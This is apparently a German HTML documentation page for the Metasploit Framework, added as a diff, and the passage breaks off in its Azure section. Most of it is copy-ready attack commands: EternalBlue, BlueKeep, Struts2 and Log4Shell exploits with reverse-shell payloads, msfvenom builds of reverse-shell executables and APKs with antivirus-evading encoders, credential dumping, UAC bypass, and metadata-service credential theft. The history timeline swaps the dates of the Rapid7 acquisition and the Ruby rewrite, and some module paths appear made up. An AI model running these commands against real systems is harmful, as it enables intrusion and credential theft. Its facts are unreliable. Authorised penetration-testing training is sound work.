@@ -1,0 +1,2106 @@
+<!DOCTYPE html>
+<html lang="de">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="Content-Security-Policy" content="default-src 'self' data:; script-src 'self' 'unsafe-inline'; style-src 'self' 'unsafe-inline' https://fonts.googleapis.com; font-src 'self' https://fonts.gstatic.com data:; img-src 'self' data:; connect-src 'self';">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Metasploit Framework 2025 – Vollständige Dokumentation</title>
+    <meta name="description" content="Komplette Metasploit Framework 2025 Dokumentation mit 26 Modulen, Cloud Security, Container Testing und modernsten Evasion Techniken">
+    <meta name="keywords" content="Metasploit, Framework, 2025, Penetration Testing, Cloud Security, Container Security, ADCS, Evasion">
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+    <!-- Haftungsausschluss-Banner -->
+    <div id="legalNotice" class="legal-warning">
+        <div class="container">
+            <p><strong>⚠️ RECHTLICHER HINWEIS:</strong> Diese Dokumentation dient ausschließlich autorisierten Penetrationstests und Bildungszwecken. Jeglicher Missbrauch ist strafbar! <a href="#legal">Vollständige rechtliche Hinweise</a></p>
+            <button id="closeNotice" class="legal-close" aria-label="Banner schließen">✕</button>
+        </div>
+    </div>
+
+    <!-- Such-Overlay -->
+    <div id="searchOverlay" class="search-overlay" aria-modal="true" role="dialog">
+        <div class="search-content">
+            <div class="search-header">
+                <h3>🔍 Dokumentation durchsuchen</h3>
+                <button id="closeSearch" class="search-close" aria-label="Suche schließen">✕</button>
+            </div>
+            <input type="text" id="searchInput" class="search-input" placeholder="Suche in der Dokumentation… (Escape schließt)">
+            <div id="searchResults" class="search-results" role="listbox"></div>
+            <div class="search-help">
+                <p><strong>Tastaturkürzel:</strong></p>
+                <ul>
+                    <li><kbd>Ctrl+K</kbd> – Suche öffnen</li>
+                    <li><kbd>Escape</kbd> – Suche schließen</li>
+                    <li><kbd>Alt+1-9</kbd> – Tab Navigation</li>
+                </ul>
+            </div>
+        </div>
+    </div>
+
+    <div class="content-wrapper">
+        <header class="header">
+            <div class="container header__content">
+                <h1 class="header__title"><span class="matrix-effect">METASPLOIT</span><span class="version">Framework 2025</span></h1>
+                <div class="header__controls">
+                    <button id="searchBtn" class="btn btn--primary btn--sm" aria-label="Suche öffnen">🔍 Suche <span class="shortcut">(Ctrl+K)</span></button>
+                    <button id="themeToggle" class="btn btn--secondary btn--sm" aria-label="Theme wechseln">🌙 Theme</button>
+                </div>
+            </div>
+        </header>
+
+        <!-- Navigation -->
+        <nav class="nav" aria-label="Hauptnavigation">
+            <div class="container">
+                <div id="tabNav" class="tab-nav" role="tablist">
+                    <button class="tab-link active" data-tab="historie" role="tab">📜 Historie</button>
+                    <button class="tab-link" data-tab="erklaerung" role="tab">🏗️ Architektur</button>
+                    <button class="tab-link" data-tab="installation" role="tab">📦 Installation</button>
+                    <button class="tab-link" data-tab="nutzung" role="tab">💻 Nutzung</button>
+                    <button class="tab-link" data-tab="module" role="tab">📊 Module</button>
+                    <button class="tab-link" data-tab="exploit" role="tab">🎯 Exploits</button>
+                    <button class="tab-link" data-tab="auxiliary" role="tab">🔍 Auxiliary</button>
+                    <button class="tab-link" data-tab="payload" role="tab">🚀 Payloads</button>
+                    <button class="tab-link" data-tab="post" role="tab">📋 Post-Exploitation</button>
+                    <button class="tab-link" data-tab="encoder" role="tab">🔐 Encoder</button>
+                    <button class="tab-link" data-tab="workspace" role="tab">🗃️ Workspace</button>
+                    <button class="tab-link" data-tab="cheatsheet" role="tab">📝 Cheat-Sheet</button>
+                    <button class="tab-link" data-tab="cloud" role="tab">☁️ Cloud</button>
+                    <button class="tab-link" data-tab="container" role="tab">🐳 Container</button>
+                    <button class="tab-link" data-tab="evasion" role="tab">🥷 Evasion</button>
+                    <button class="tab-link" data-tab="sessions" role="tab">🔗 Sessions</button>
+                    <button class="tab-link" data-tab="memory" role="tab">🧠 Memory</button>
+                    <button class="tab-link" data-tab="adcs" role="tab">🏛️ AD CS</button>
+                    <button class="tab-link" data-tab="framework-api" role="tab">🔧 Framework-API</button>
+                    <button class="tab-link" data-tab="automation" role="tab">🤖 Automation</button>
+                    <button class="tab-link" data-tab="threat-intel" role="tab">🕵️ Threat-Intel</button>
+                    <button class="tab-link" data-tab="mobile" role="tab">📱 Mobile</button>
+                    <button class="tab-link" data-tab="iot" role="tab">🌐 IoT</button>
+                    <button class="tab-link" data-tab="forensics" role="tab">🔬 Forensics</button>
+                    <button class="tab-link" data-tab="compliance" role="tab">📊 Compliance</button>
+                    <button class="tab-link" data-tab="legal" role="tab">⚖️ Legal</button>
+                </div>
+            </div>
+        </nav>
+
+        <!-- Hauptinhalt -->
+        <main class="main container" id="mainContent">
+            
+            <!-- Historie Tab -->
+            <section id="historie" class="tab-content active" role="tabpanel">
+                <h2>📜 Geschichte des Metasploit Frameworks</h2>
+                <div class="card">
+                    <div class="card__body">
+                        <h3>🕰️ Komplette Chronologie 2003-2025</h3>
+                        <div class="timeline">
+                            <div class="timeline-item">
+                                <div class="timeline-year">2003</div>
+                                <div class="timeline-content">
+                                    <h4>Geburtsstunde</h4>
+                                    <p>H.D. Moore entwickelt das erste Metasploit Framework in Perl</p>
+                                </div>
+                            </div>
+                            <div class="timeline-item">
+                                <div class="timeline-year">2007</div>
+                                <div class="timeline-content">
+                                    <h4>Übernahme durch Rapid7</h4>
+                                    <p>Kommerzialisierung und professionelle Weiterentwicklung</p>
+                                </div>
+                            </div>
+                            <div class="timeline-item">
+                                <div class="timeline-year">2009</div>
+                                <div class="timeline-content">
+                                    <h4>Ruby-Reimplementierung</h4>
+                                    <p>Vollständige Neuentwicklung in Ruby für bessere Erweiterbarkeit</p>
+                                </div>
+                            </div>
+                            <div class="timeline-item">
+                                <div class="timeline-year">2025</div>
+                                <div class="timeline-content">
+                                    <h4>Cloud-Native Era</h4>
+                                    <p>Kubernetes, Cloud Security, Container Exploitation, AI-Integration</p>
+                                </div>
+                            </div>
+                        </div>
+                        
+                        <div class="code-block">
+                            <button class="copy-btn" data-copy="# Metasploit Framework Version anzeigen
+msfconsole --version
+
+# Build-Informationen  
+msfconsole -v
+
+# Update-Status prüfen
+msfupdate">📋</button>
+                            <pre><code># Metasploit Framework Version anzeigen
+msfconsole --version
+
+# Build-Informationen  
+msfconsole -v
+
+# Update-Status prüfen
+msfupdate</code></pre>
+                        </div>
+                    </div>
+                </div>
+            </section>
+
+            <!-- Erklärung Tab -->
+            <section id="erklaerung" class="tab-content" role="tabpanel">
+                <h2>🏗️ Framework-Architektur</h2>
+                <div class="card">
+                    <div class="card__body">
+                        <h3>⚙️ Detaillierte Architektur</h3>
+                        <p>Das Metasploit Framework basiert auf einer modularen Ruby-Architektur mit folgenden Hauptkomponenten:</p>
+                        
+                        <div class="architecture-grid">
+                            <div class="arch-component">
+                                <h4>🖥️ MSF Console</h4>
+                                <p>Hauptinterface für alle Framework-Funktionen</p>
+                            </div>
+                            <div class="arch-component">
+                                <h4>🚀 MSFVenom</h4>
+                                <p>Payload-Generator und Encoder</p>
+                            </div>
+                            <div class="arch-component">
+                                <h4>🗄️ MSF Database</h4>
+                                <p>PostgreSQL-basierte Datenpersistierung</p>
+                            </div>
+                            <div class="arch-component">
+                                <h4>🔧 Module System</h4>
+                                <p>Modulare Exploit-, Auxiliary- und Post-Module</p>
+                            </div>
+                        </div>
+
+                        <div class="code-block">
+                            <button class="copy-btn" data-copy="# Framework-Struktur anzeigen
+ls -la /opt/metasploit-framework/
+
+# Module-Pfade
+echo $MSF_MODULE_PATHS
+
+# Aktive Konfiguration
+cat ~/.msf4/config">📋</button>
+                            <pre><code># Framework-Struktur anzeigen
+ls -la /opt/metasploit-framework/
+
+# Module-Pfade
+echo $MSF_MODULE_PATHS
+
+# Aktive Konfiguration
+cat ~/.msf4/config</code></pre>
+                        </div>
+                    </div>
+                </div>
+            </section>
+
+            <!-- Installation Tab -->
+            <section id="installation" class="tab-content" role="tabpanel">
+                <h2>📦 Installation auf allen Systemen</h2>
+                <div class="card">
+                    <div class="card__body">
+                        <h3>🐧 Kali Linux Installation</h3>
+                        <div class="code-block">
+                            <button class="copy-btn" data-copy="# System aktualisieren
+sudo apt update && sudo apt upgrade -y
+
+# Metasploit ist vorinstalliert - Datenbank initialisieren
+sudo msfdb init
+
+# Framework starten
+msfconsole">📋</button>
+                            <pre><code># System aktualisieren
+sudo apt update && sudo apt upgrade -y
+
+# Metasploit ist vorinstalliert - Datenbank initialisieren
+sudo msfdb init
+
+# Framework starten
+msfconsole</code></pre>
+                        </div>
+
+                        <h3>🐳 Docker Installation (2025)</h3>
+                        <div class="code-block">
+                            <button class="copy-btn" data-copy="# Official Metasploit Container
+docker pull metasploitframework/metasploit-framework:latest
+
+# Container mit Datenbank starten
+docker run --rm -it -p 5432:5432 -e POSTGRES_PASSWORD=msf metasploitframework/metasploit-framework
+
+# Docker Compose Setup
+version: '3.8'
+services:
+  metasploit:
+    image: metasploitframework/metasploit-framework:latest
+    ports:
+      - '4444:4444'
+    environment:
+      - DATABASE_URL=postgresql://msf:password@db:5432/msf
+  db:
+    image: postgres:13
+    environment:
+      - POSTGRES_DB=msf
+      - POSTGRES_USER=msf
+      - POSTGRES_PASSWORD=password">📋</button>
+                            <pre><code># Official Metasploit Container
+docker pull metasploitframework/metasploit-framework:latest
+
+# Container mit Datenbank starten
+docker run --rm -it -p 5432:5432 -e POSTGRES_PASSWORD=msf metasploitframework/metasploit-framework
+
+# Docker Compose Setup
+version: '3.8'
+services:
+  metasploit:
+    image: metasploitframework/metasploit-framework:latest
+    ports:
+      - '4444:4444'
+    environment:
+      - DATABASE_URL=postgresql://msf:password@db:5432/msf
+  db:
+    image: postgres:13
+    environment:
+      - POSTGRES_DB=msf
+      - POSTGRES_USER=msf
+      - POSTGRES_PASSWORD=password</code></pre>
+                        </div>
+
+                        <h3>🪟 Windows Installation</h3>
+                        <div class="code-block">
+                            <button class="copy-btn" data-copy="# Via Chocolatey
+choco install metasploit
+
+# Via Scoop
+scoop install metasploit
+
+# WSL2 Installation
+wsl --install -d Kali-Linux
+
+# PowerShell Installation
+wget https://github.com/rapid7/metasploit-framework/archive/master.zip
+Expand-Archive master.zip
+cd metasploit-framework-master
+bundle install">📋</button>
+                            <pre><code># Via Chocolatey
+choco install metasploit
+
+# Via Scoop
+scoop install metasploit
+
+# WSL2 Installation
+wsl --install -d Kali-Linux
+
+# PowerShell Installation
+wget https://github.com/rapid7/metasploit-framework/archive/master.zip
+Expand-Archive master.zip
+cd metasploit-framework-master
+bundle install</code></pre>
+                        </div>
+
+                        <h3>🍎 macOS Installation</h3>
+                        <div class="code-block">
+                            <button class="copy-btn" data-copy="# Via Homebrew
+brew install metasploit
+
+# Via MacPorts
+sudo port install metasploit
+
+# Manual Installation
+curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall && chmod 755 msfinstall && ./msfinstall
+
+# Ruby Installation with rbenv
+rbenv install 3.0.0
+rbenv global 3.0.0
+git clone https://github.com/rapid7/metasploit-framework.git
+cd metasploit-framework
+bundle install">📋</button>
+                            <pre><code># Via Homebrew
+brew install metasploit
+
+# Via MacPorts
+sudo port install metasploit
+
+# Manual Installation
+curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall && chmod 755 msfinstall && ./msfinstall
+
+# Ruby Installation with rbenv
+rbenv install 3.0.0
+rbenv global 3.0.0
+git clone https://github.com/rapid7/metasploit-framework.git
+cd metasploit-framework
+bundle install</code></pre>
+                        </div>
+                    </div>
+                </div>
+            </section>
+
+            <!-- Nutzung Tab -->
+            <section id="nutzung" class="tab-content" role="tabpanel">
+                <h2>💻 Grundlegende bis erweiterte Nutzung</h2>
+                <div class="card">
+                    <div class="card__body">
+                        <h3>🚀 Erste Schritte</h3>
+                        <div class="code-block">
+                            <button class="copy-btn" data-copy="# Metasploit Console starten
+msfconsole
+
+# Hilfe anzeigen
+help
+
+# Module suchen
+search type:exploit platform:windows
+
+# Datenbank-Status prüfen
+db_status
+
+# Netzwerk-Scan durchführen
+db_nmap -sV 192.168.1.0/24">📋</button>
+                            <pre><code># Metasploit Console starten
+msfconsole
+
+# Hilfe anzeigen
+help
+
+# Module suchen
+search type:exploit platform:windows
+
+# Datenbank-Status prüfen
+db_status
+
+# Netzwerk-Scan durchführen
+db_nmap -sV 192.168.1.0/24</code></pre>
+                        </div>
+
+                        <h3>🔍 Erweiterte Suchfunktionen</h3>
+                        <div class="code-block">
+                            <button class="copy-btn" data-copy="# Nach CVE suchen
+search cve:2021
+
+# Kombinierte Suche
+search type:exploit platform:linux rank:great
+
+# Module-Informationen
+info exploit/windows/smb/ms17_010_eternalblue
+
+# Alle verfügbaren Payloads
+show payloads
+
+# Optionen eines Moduls anzeigen
+show options
+
+# Erweiterte Optionen
+show advanced">📋</button>
+                            <pre><code># Nach CVE suchen
+search cve:2021
+
+# Kombinierte Suche
+search type:exploit platform:linux rank:great
+
+# Module-Informationen
+info exploit/windows/smb/ms17_010_eternalblue
+
+# Alle verfügbaren Payloads
+show payloads
+
+# Optionen eines Moduls anzeigen
+show options
+
+# Erweiterte Optionen
+show advanced</code></pre>
+                        </div>
+                    </div>
+                </div>
+            </section>
+
+            <!-- Module Tab -->
+            <section id="module" class="tab-content" role="tabpanel">
+                <h2>📊 Module Overview</h2>
+                <div class="card">
+                    <div class="card__body">
+                        <h3>🎯 Alle 6 Modultypen detailliert</h3>
+                        <div class="architecture-grid">
+                            <div class="arch-component">
+                                <h4>💥 Exploit Module</h4>
+                                <p>Nutzen Schwachstellen aus, um Zugang zu Systemen zu erlangen</p>
+                            </div>
+                            <div class="arch-component">
+                                <h4>🔍 Auxiliary Module</h4>
+                                <p>Scanner, Fuzzer, DoS-Tools und andere Hilfsfunktionen</p>
+                            </div>
+                            <div class="arch-component">
+                                <h4>🚀 Payload Module</h4>
+                                <p>Code der nach erfolgreichem Exploit ausgeführt wird</p>
+                            </div>
+                            <div class="arch-component">
+                                <h4>📋 Post-Exploitation</h4>
+                                <p>Aktionen nach erfolgreichem Exploit</p>
+                            </div>
+                            <div class="arch-component">
+                                <h4>🔐 Encoder Module</h4>
+                                <p>Verschleiern Payloads vor Antivirus-Software</p>
+                            </div>
+                            <div class="arch-component">
+                                <h4>🥷 Evasion Module</h4>
+                                <p>Umgehen von Sicherheitsmaßnahmen</p>
+                            </div>
+                        </div>
+
+                        <div class="code-block">
+                            <button class="copy-btn" data-copy="# Module-Typen anzeigen
+show exploits
+show auxiliary
+show payloads
+show post
+show encoders
+show evasion
+
+# Module-Statistiken
+stats
+
+# Neue Module seit letztem Update
+show recent
+
+# Module nach Rang filtern
+search rank:excellent">📋</button>
+                            <pre><code># Module-Typen anzeigen
+show exploits
+show auxiliary
+show payloads
+show post
+show encoders
+show evasion
+
+# Module-Statistiken
+stats
+
+# Neue Module seit letztem Update
+show recent
+
+# Module nach Rang filtern
+search rank:excellent</code></pre>
+                        </div>
+                    </div>
+                </div>
+            </section>
+
+            <!-- Exploit Tab -->
+            <section id="exploit" class="tab-content" role="tabpanel">
+                <h2>🎯 Top 50 Exploits mit Laborbeispielen</h2>
+                <div class="card">
+                    <div class="card__body">
+                        <h3>💥 Beliebte Exploits</h3>
+                        <div class="code-block">
+                            <button class="copy-btn" data-copy="# EternalBlue (MS17-010)
+use exploit/windows/smb/ms17_010_eternalblue
+set RHOSTS 192.168.1.100
+set PAYLOAD windows/x64/meterpreter/reverse_tcp
+set LHOST 192.168.1.10
+set LPORT 4444
+exploit
+
+# BlueKeep (CVE-2019-0708)
+use exploit/windows/rdp/cve_2019_0708_bluekeep_rce
+set RHOSTS 192.168.1.100
+set PAYLOAD windows/x64/meterpreter/reverse_tcp
+set LHOST 192.168.1.10
+exploit">📋</button>
+                            <pre><code># EternalBlue (MS17-010)
+use exploit/windows/smb/ms17_010_eternalblue
+set RHOSTS 192.168.1.100
+set PAYLOAD windows/x64/meterpreter/reverse_tcp
+set LHOST 192.168.1.10
+set LPORT 4444
+exploit
+
+# BlueKeep (CVE-2019-0708)
+use exploit/windows/rdp/cve_2019_0708_bluekeep_rce
+set RHOSTS 192.168.1.100
+set PAYLOAD windows/x64/meterpreter/reverse_tcp
+set LHOST 192.168.1.10
+exploit</code></pre>
+                        </div>
+
+                        <h3>🌐 Web-Exploits</h3>
+                        <div class="code-block">
+                            <button class="copy-btn" data-copy="# Apache Struts2 RCE
+use exploit/multi/http/struts2_content_type_ognl
+set RHOSTS 192.168.1.100
+set TARGETURI /struts2-showcase
+set PAYLOAD linux/x64/meterpreter/reverse_tcp
+set LHOST 192.168.1.10
+exploit
+
+# Log4Shell (CVE-2021-44228)
+use exploit/multi/http/log4shell_header_injection
+set RHOSTS 192.168.1.100
+set TARGETURI /
+set PAYLOAD linux/x64/meterpreter/reverse_tcp
+set LHOST 192.168.1.10
+exploit">📋</button>
+                            <pre><code># Apache Struts2 RCE
+use exploit/multi/http/struts2_content_type_ognl
+set RHOSTS 192.168.1.100
+set TARGETURI /struts2-showcase
+set PAYLOAD linux/x64/meterpreter/reverse_tcp
+set LHOST 192.168.1.10
+exploit
+
+# Log4Shell (CVE-2021-44228)
+use exploit/multi/http/log4shell_header_injection
+set RHOSTS 192.168.1.100
+set TARGETURI /
+set PAYLOAD linux/x64/meterpreter/reverse_tcp
+set LHOST 192.168.1.10
+exploit</code></pre>
+                        </div>
+                    </div>
+                </div>
+            </section>
+
+            <!-- Auxiliary Tab -->
+            <section id="auxiliary" class="tab-content" role="tabpanel">
+                <h2>🔍 Scanner, Fuzzer, Enumeration Tools</h2>
+                <div class="card">
+                    <div class="card__body">
+                        <h3>🔎 Scanner Module</h3>
+                        <div class="code-block">
+                            <button class="copy-btn" data-copy="# Port Scanner
+use auxiliary/scanner/portscan/tcp
+set RHOSTS 192.168.1.0/24
+set PORTS 80,443,8080,22,21,25,445,3389
+set THREADS 50
+run
+
+# HTTP Directory Scanner
+use auxiliary/scanner/http/dir_scanner
+set RHOSTS 192.168.1.100
+set DICTIONARY /usr/share/wordlists/dirb/common.txt
+run">📋</button>
+                            <pre><code># Port Scanner
+use auxiliary/scanner/portscan/tcp
+set RHOSTS 192.168.1.0/24
+set PORTS 80,443,8080,22,21,25,445,3389
+set THREADS 50
+run
+
+# HTTP Directory Scanner
+use auxiliary/scanner/http/dir_scanner
+set RHOSTS 192.168.1.100
+set DICTIONARY /usr/share/wordlists/dirb/common.txt
+run</code></pre>
+                        </div>
+
+                        <h3>🌐 SMB Scanner</h3>
+                        <div class="code-block">
+                            <button class="copy-btn" data-copy="# SMB Version Scanner
+use auxiliary/scanner/smb/smb_version
+set RHOSTS 192.168.1.0/24
+set THREADS 50
+run
+
+# SMB Shares enumeration
+use auxiliary/scanner/smb/smb_enumshares
+set RHOSTS 192.168.1.100
+run
+
+# SMB Login Scanner
+use auxiliary/scanner/smb/smb_login
+set RHOSTS 192.168.1.100
+set SMBUser administrator
+set SMBPass password
+run">📋</button>
+                            <pre><code># SMB Version Scanner
+use auxiliary/scanner/smb/smb_version
+set RHOSTS 192.168.1.0/24
+set THREADS 50
+run
+
+# SMB Shares enumeration
+use auxiliary/scanner/smb/smb_enumshares
+set RHOSTS 192.168.1.100
+run
+
+# SMB Login Scanner
+use auxiliary/scanner/smb/smb_login
+set RHOSTS 192.168.1.100
+set SMBUser administrator
+set SMBPass password
+run</code></pre>
+                        </div>
+                    </div>
+                </div>
+            </section>
+
+            <!-- Payload Tab -->
+            <section id="payload" class="tab-content" role="tabpanel">
+                <h2>🚀 msfvenom und alle Payload-Typen</h2>
+                <div class="card">
+                    <div class="card__body">
+                        <h3>💻 Meterpreter Payloads</h3>
+                        <div class="code-block">
+                            <button class="copy-btn" data-copy="# Windows Meterpreter
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f exe -o payload.exe
+
+# Linux Meterpreter
+msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f elf -o payload.elf
+
+# PowerShell Payload
+msfvenom -p windows/x64/powershell_reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f psh -o payload.ps1
+
+# Python Payload
+msfvenom -p python/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f py -o payload.py">📋</button>
+                            <pre><code># Windows Meterpreter
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f exe -o payload.exe
+
+# Linux Meterpreter
+msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f elf -o payload.elf
+
+# PowerShell Payload
+msfvenom -p windows/x64/powershell_reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f psh -o payload.ps1
+
+# Python Payload
+msfvenom -p python/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f py -o payload.py</code></pre>
+                        </div>
+
+                        <h3>📱 Mobile Payloads</h3>
+                        <div class="code-block">
+                            <button class="copy-btn" data-copy="# Android APK
+msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -o payload.apk
+
+# iOS Payload
+msfvenom -p apple_ios/aarch64/meterpreter_reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f macho -o payload.macho
+
+# Web Payload (PHP)
+msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f raw -o payload.php
+
+# JavaScript Payload
+msfvenom -p nodejs/shell_reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f js_le -o payload.js">📋</button>
+                            <pre><code># Android APK
+msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -o payload.apk
+
+# iOS Payload
+msfvenom -p apple_ios/aarch64/meterpreter_reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f macho -o payload.macho
+
+# Web Payload (PHP)
+msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f raw -o payload.php
+
+# JavaScript Payload
+msfvenom -p nodejs/shell_reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f js_le -o payload.js</code></pre>
+                        </div>
+                    </div>
+                </div>
+            </section>
+
+            <!-- Post-Exploitation Tab -->
+            <section id="post" class="tab-content" role="tabpanel">
+                <h2>📋 Vollständige Post-Exploitation Techniken</h2>
+                <div class="card">
+                    <div class="card__body">
+                        <h3>🔑 Credential Harvesting</h3>
+                        <div class="code-block">
+                            <button class="copy-btn" data-copy="# Hash Dump
+use post/windows/gather/hashdump
+set SESSION 1
+run
+
+# Mimikatz
+use post/windows/gather/credentials/credential_collector
+set SESSION 1
+run
+
+# Smart Hash Dump
+use post/windows/gather/smart_hashdump
+set SESSION 1
+run
+
+# Cached Credentials
+use post/windows/gather/cachedump
+set SESSION 1
+run">📋</button>
+                            <pre><code># Hash Dump
+use post/windows/gather/hashdump
+set SESSION 1
+run
+
+# Mimikatz
+use post/windows/gather/credentials/credential_collector
+set SESSION 1
+run
+
+# Smart Hash Dump
+use post/windows/gather/smart_hashdump
+set SESSION 1
+run
+
+# Cached Credentials
+use post/windows/gather/cachedump
+set SESSION 1
+run</code></pre>
+                        </div>
+
+                        <h3>🎯 Privilege Escalation</h3>
+                        <div class="code-block">
+                            <button class="copy-btn" data-copy="# Windows Privilege Escalation
+use post/multi/recon/local_exploit_suggester
+set SESSION 1
+run
+
+# UAC Bypass
+use exploit/windows/local/bypassuac_eventvwr
+set SESSION 1
+run
+
+# Token Impersonation
+use post/windows/manage/impersonate_token
+set SESSION 1
+set TOKEN 1234
+run">📋</button>
+                            <pre><code># Windows Privilege Escalation
+use post/multi/recon/local_exploit_suggester
+set SESSION 1
+run
+
+# UAC Bypass
+use exploit/windows/local/bypassuac_eventvwr
+set SESSION 1
+run
+
+# Token Impersonation
+use post/windows/manage/impersonate_token
+set SESSION 1
+set TOKEN 1234
+run</code></pre>
+                        </div>
+                    </div>
+                </div>
+            </section>
+
+            <!-- Encoder Tab -->
+            <section id="encoder" class="tab-content" role="tabpanel">
+                <h2>🔐 Alle Encoder + moderne Evasion</h2>
+                <div class="card">
+                    <div class="card__body">
+                        <h3>🛡️ Payload Encoding</h3>
+                        <div class="code-block">
+                            <button class="copy-btn" data-copy="# Shikata Ga Nai Encoder
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -e x86/shikata_ga_nai -i 10 -f exe -o encoded.exe
+
+# Multiple Encoding
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -e x86/shikata_ga_nai -e x86/alpha_mixed -i 5 -f exe -o multi_encoded.exe
+
+# x64 Encoding
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -e x64/xor_dynamic -i 3 -f exe -o x64_encoded.exe
+
+# Available Encoders
+msfvenom --list encoders">📋</button>
+                            <pre><code># Shikata Ga Nai Encoder
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -e x86/shikata_ga_nai -i 10 -f exe -o encoded.exe
+
+# Multiple Encoding
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -e x86/shikata_ga_nai -e x86/alpha_mixed -i 5 -f exe -o multi_encoded.exe
+
+# x64 Encoding
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -e x64/xor_dynamic -i 3 -f exe -o x64_encoded.exe
+
+# Available Encoders
+msfvenom --list encoders</code></pre>
+                        </div>
+                    </div>
+                </div>
+            </section>
+
+            <!-- Workspace Tab -->
+            <section id="workspace" class="tab-content" role="tabpanel">
+                <h2>🗃️ Datenbank-Management und Projekte</h2>
+                <div class="card">
+                    <div class="card__body">
+                        <h3>📁 Workspace Management</h3>
+                        <div class="code-block">
+                            <button class="copy-btn" data-copy="# Workspaces anzeigen
+workspace
+
+# Neuen Workspace erstellen
+workspace -a projekt1
+
+# Workspace wechseln
+workspace projekt1
+
+# Workspace löschen
+workspace -d projekt1
+
+# Hosts anzeigen
+hosts
+
+# Services anzeigen
+services
+
+# Vulnerabilities anzeigen
+vulns">📋</button>
+                            <pre><code># Workspaces anzeigen
+workspace
+
+# Neuen Workspace erstellen
+workspace -a projekt1
+
+# Workspace wechseln
+workspace projekt1
+
+# Workspace löschen
+workspace -d projekt1
+
+# Hosts anzeigen
+hosts
+
+# Services anzeigen
+services
+
+# Vulnerabilities anzeigen
+vulns</code></pre>
+                        </div>
+                    </div>
+                </div>
+            </section>
+
+            <!-- Cheatsheet Tab -->
+            <section id="cheatsheet" class="tab-content" role="tabpanel">
+                <h2>📝 Vollständige Befehlsreferenz</h2>
+                <div class="card">
+                    <div class="card__body">
+                        <h3>⚡ Grundbefehle</h3>
+                        <div class="code-block">
+                            <button class="copy-btn" data-copy="# Basis
+msfconsole          # Console starten
+help                # Hilfe anzeigen
+exit                # Beenden
+version             # Version anzeigen
+
+# Module
+use [module]        # Modul verwenden
+show options        # Optionen anzeigen
+set [option] [value] # Option setzen
+run / exploit       # Ausführen
+back                # Zurück
+
+# Suche
+search [term]       # Module suchen
+info [module]       # Modul-Info anzeigen
+
+# Sessions
+sessions            # Sessions anzeigen
+sessions -i [id]    # Session interagieren
+sessions -k [id]    # Session beenden">📋</button>
+                            <pre><code># Basis
+msfconsole          # Console starten
+help                # Hilfe anzeigen
+exit                # Beenden
+version             # Version anzeigen
+
+# Module
+use [module]        # Modul verwenden
+show options        # Optionen anzeigen
+set [option] [value] # Option setzen
+run / exploit       # Ausführen
+back                # Zurück
+
+# Suche
+search [term]       # Module suchen
+info [module]       # Modul-Info anzeigen
+
+# Sessions
+sessions            # Sessions anzeigen
+sessions -i [id]    # Session interagieren
+sessions -k [id]    # Session beenden</code></pre>
+                        </div>
+                    </div>
+                </div>
+            </section>
+
+            <!-- Cloud Tab -->
+            <section id="cloud" class="tab-content" role="tabpanel">
+                <h2>☁️ AWS/Azure/GCP Exploitation (VOLLSTÄNDIG)</h2>
+                <div class="card">
+                    <div class="card__body">
+                        <h3>🌐 AWS Security Testing</h3>
+                        <div class="code-block">
+                            <button class="copy-btn" data-copy="# AWS Metadata Service
+use auxiliary/cloud/aws/enum_ec2
+set RHOSTS 169.254.169.254
+run
+
+# S3 Bucket Enumeration
+use auxiliary/scanner/http/s3_bucket_scanner
+set BUCKET_NAME target-bucket
+run
+
+# AWS CLI Enumeration
+aws s3 ls --no-sign-request
+aws s3 ls s3://bucket-name --no-sign-request --recursive
+
+# EC2 Instance Metadata
+curl http://169.254.169.254/latest/meta-data/
+curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
+
+# Lambda Function Enumeration
+aws lambda list-functions --region us-east-1">📋</button>
+                            <pre><code># AWS Metadata Service
+use auxiliary/cloud/aws/enum_ec2
+set RHOSTS 169.254.169.254
+run
+
+# S3 Bucket Enumeration
+use auxiliary/scanner/http/s3_bucket_scanner
+set BUCKET_NAME target-bucket
+run
+
+# AWS CLI Enumeration
+aws s3 ls --no-sign-request
+aws s3 ls s3://bucket-name --no-sign-request --recursive
+
+# EC2 Instance Metadata
+curl http://169.254.169.254/latest/meta-data/
+curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
+
+# Lambda Function Enumeration
+aws lambda list-functions --region us-east-1</code></pre>
+                        </div>
+
+                        <h3>☁️ Azure Testing</h3>
+                        <div class="code-block">
+                            <button class="copy-btn" data-copy="# Azure Metadata Service
+use auxiliary/cloud/azure/enum_subscriptions
+set RHOSTS 169.254.169.254
+run
+
+# Azure Storage Account Enumeration
+use auxiliary/cloud/azure/storage_account_enum
+set STORAGE_ACCOUNT target-storage
